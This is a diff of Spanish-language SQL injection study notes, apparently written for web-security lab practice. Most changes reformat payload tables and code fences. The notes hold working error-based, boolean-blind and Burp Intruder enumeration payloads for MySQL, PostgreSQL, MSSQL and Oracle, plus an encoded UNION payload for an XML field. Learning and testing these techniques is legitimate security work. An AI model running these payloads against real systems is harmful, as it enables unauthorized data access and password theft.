@@ -107,12 +107,12 @@ Tags: #Sql #Postgres #mysql #database #inyección #injection #explotación #Expl
 
 ### 🧩 Sintaxis por SGBD
 
-|**Motor**|**Técnica**|
-|---|---|
-|**MySQL**|`SELECT EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))`|
-|**PostgreSQL**|`SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`|
-|**MSSQL**|`SELECT 1/0`|
-|**Oracle**|`SELECT TO_CHAR(1/0) FROM dual`|
+| **Motor**      | **Técnica**                                                 |
+| -------------- | ----------------------------------------------------------- |
+| **MySQL**      | `SELECT EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))` |
+| **PostgreSQL** | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`  |
+| **MSSQL**      | `SELECT 1/0`                                                |
+| **Oracle**     | `SELECT TO_CHAR(1/0) FROM dual`                             |
 
 ### 1. El Concepto Fundamental
 
@@ -164,9 +164,7 @@ Usando tu ejemplo de `TrackingId` para extraer la contraseña del primer usuario
 
 #### En MySQL (Sintaxis corta):
 
-SQL
-
-```
+```SQL
 ' OR 1=CAST((SELECT password FROM users LIMIT 1) AS UNSIGNED)-- -
 ```
 
@@ -174,9 +172,7 @@ SQL
 
 Oracle no tiene `LIMIT`, usa `ROWNUM`. Además, `TO_NUMBER` es la forma más corta de forzar el error:
 
-SQL
-
-```
+```SQL
 ' AND 1=TO_NUMBER((SELECT password FROM users WHERE ROWNUM=1))--
 ```
 
@@ -228,21 +224,21 @@ SQL
 
 ### 🧩 Sintaxis por SGBD
 
-|**Motor**|**TRUE**|**FALSE**|
-|---|---|---|
-|**MySQL**|`' AND 1=1--`|`' AND 1=2--`|
-|**PostgreSQL**|`' AND 1=1--`|`' AND 1=2--`|
-|**MSSQL**|`' AND 1=1--`|`' AND 1=2--`|
-|**Oracle**|`' AND 'a'='a'--`|`' AND 'a'='b'--`|
+| **Motor**      | **TRUE**          | **FALSE**         |
+| -------------- | ----------------- | ----------------- |
+| **MySQL**      | `' AND 1=1--`     | `' AND 1=2--`     |
+| **PostgreSQL** | `' AND 1=1--`     | `' AND 1=2--`     |
+| **MSSQL**      | `' AND 1=1--`     | `' AND 1=2--`     |
+| **Oracle**     | `' AND 'a'='a'--` | `' AND 'a'='b'--` |
 
 ### Guía de Inyección Blind SQL con Payloads (Cluster Bomb)
 
-|**SGBD**|**Listar Bases de Datos (Esquemas)**|**Listar Tablas (de la DB actual)**|**Listar Columnas (de una tabla)**|
-|---|---|---|---|
-|**PostgreSQL**|`' AND (SELECT SUBSTRING(schema_name,§1§,1) FROM information_schema.schemata LIMIT 1 OFFSET §0§) = '§a§'--`|`... (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET §0§) = '§a§'--`|`... (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='usuarios' LIMIT 1 OFFSET §0§) = '§a§'--`|
-|**MySQL**|`... (SELECT SUBSTRING(schema_name,§1§,1) FROM information_schema.schemata LIMIT 1 OFFSET §0§) = '§a§'--`|`... (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET §0§) = '§a§'--`|`... (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='usuarios' LIMIT 1 OFFSET §0§) = '§a§'--`|
-|**MS SQL Server**|`... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM master..sysdatabases) t WHERE row=§0§+1) = '§a§'--`|`... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM sysobjects WHERE xtype='U') t WHERE row=§0§+1) = '§a§'--`|`... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM syscolumns WHERE id=OBJECT_ID('usuarios')) t WHERE row=§0§+1) = '§a§'--`|
-|**Oracle**|`... (SELECT SUBSTR(username,§1§,1) FROM (SELECT username, rownum as r FROM all_users) WHERE r=§0§+1) = '§a§'--`|`... (SELECT SUBSTR(table_name,§1§,1) FROM (SELECT table_name, rownum as r FROM all_tables) WHERE r=§0§+1) = '§a§'--`|`... (SELECT SUBSTR(column_name,§1§,1) FROM (SELECT column_name, rownum as r FROM all_tab_columns WHERE table_name='USUARIOS') WHERE r=§0§+1) = '§a§'--`|
+| **SGBD**          | **Listar Bases de Datos (Esquemas)**                                                                                                                    | **Listar Tablas (de la DB actual)**                                                                                                                           | **Listar Columnas (de una tabla)**                                                                                                                                           |
+| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **PostgreSQL**    | `' AND (SELECT SUBSTRING(schema_name,§1§,1) FROM information_schema.schemata LIMIT 1 OFFSET §0§) = '§a§'--`                                             | `... (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET §0§) = '§a§'--`                            | `... (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='usuarios' LIMIT 1 OFFSET §0§) = '§a§'--`                                         |
+| **MySQL**         | `... (SELECT SUBSTRING(schema_name,§1§,1) FROM information_schema.schemata LIMIT 1 OFFSET §0§) = '§a§'--`                                               | `... (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET §0§) = '§a§'--`                          | `... (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='usuarios' LIMIT 1 OFFSET §0§) = '§a§'--`                                         |
+| **MS SQL Server** | `... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM master..sysdatabases) t WHERE row=§0§+1) = '§a§'--` | `... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM sysobjects WHERE xtype='U') t WHERE row=§0§+1) = '§a§'--` | `... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM syscolumns WHERE id=OBJECT_ID('usuarios')) t WHERE row=§0§+1) = '§a§'--` |
+| **Oracle**        | `... (SELECT SUBSTR(username,§1§,1) FROM (SELECT username, rownum as r FROM all_users) WHERE r=§0§+1) = '§a§'--`                                        | `... (SELECT SUBSTR(table_name,§1§,1) FROM (SELECT table_name, rownum as r FROM all_tables) WHERE r=§0§+1) = '§a§'--`                                         | `... (SELECT SUBSTR(column_name,§1§,1) FROM (SELECT column_name, rownum as r FROM all_tab_columns WHERE table_name='USUARIOS') WHERE r=§0§+1) = '§a§'--`                     |
 
 > [!example]+
 > 
@@ -435,7 +431,6 @@ if __name__ == "__main__":
 
 ### Ejemplo de script en python para extraer datos con Blind SQLi basado en errores
 
-Python
 
 ```python
 import requests
@@ -765,9 +760,7 @@ Debes probar cuántas columnas tiene la consulta original para que el UNION no f
 
 Utiliza la lógica de iteración que vimos antes:
 
-XML
-
-```
+```XML
 <storeId>
   <@hex_entities>
     1 UNION SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0--
